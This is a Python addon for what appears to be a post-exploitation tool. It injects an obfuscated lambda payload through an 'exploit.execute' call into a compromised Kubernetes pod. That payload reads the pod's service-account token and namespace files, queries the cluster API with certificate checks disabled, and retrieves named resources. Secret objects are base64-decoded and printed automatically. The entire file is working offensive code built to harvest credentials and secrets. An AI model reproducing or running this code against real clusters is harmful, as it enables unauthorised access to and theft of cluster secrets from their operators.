import json
import base64

def run(exploit, params=None):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    
    # Format: <resource> <name> [namespace]
    if not params or len(params) < 2:
        print(f" {R}!!{N} Usage: --addon k8s_get <resource> <name> [namespace]")
        return

    target_res = params[0]
    target_name = params[1]
    target_ns = params[2] if len(params) > 2 else None

    ns_display = target_ns if target_ns else "LOCAL"
    ns_logic = f"'{target_ns}'" if target_ns else "open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip()"

    print(f"\n{B}[ K8S EXPLORER: GET {C}{target_res.upper()}/{target_name}{B} in {C}{ns_display}{B} ]{N}")

    payload = (
        f"(lambda ns, name, res, token: (lambda conn: (conn.request('GET', f'/api/v1/namespaces/{{ns}}/{{res}}/{{name}}', "
        f"headers={{'Authorization': 'Bearer ' + token}}), "
        f"conn.getresponse().read().decode())[1])"
        f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
        f"({ns_logic}, '{target_name}', '{target_res}', open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip())"
    )

    result = exploit.execute(payload)
    try:
        data = json.loads(result)
        if data.get("kind") == "Status":
            print(f" {R}!!{N} API ERROR: {data.get('message')}")
            return

        # Auto-decode if it's a Secret
        if data.get('kind') == 'Secret' and 'data' in data:
            print(f"{C}DECODED CONTENT:{N}")
            decoded = {k: base64.b64decode(v).decode('utf-8', errors='replace') for k, v in data['data'].items()}
            print(json.dumps(decoded, indent=4))
        else:
            # For Pods, ConfigMaps, etc.
            print(f"{C}OBJECT DATA:{N}\n{json.dumps(data, indent=4)}")
    except:
        print(f" {R}!!{N} Get failed. API Response: {result[:200]}")
    print(f"\n{B}[ Operation Complete ]{N}\n")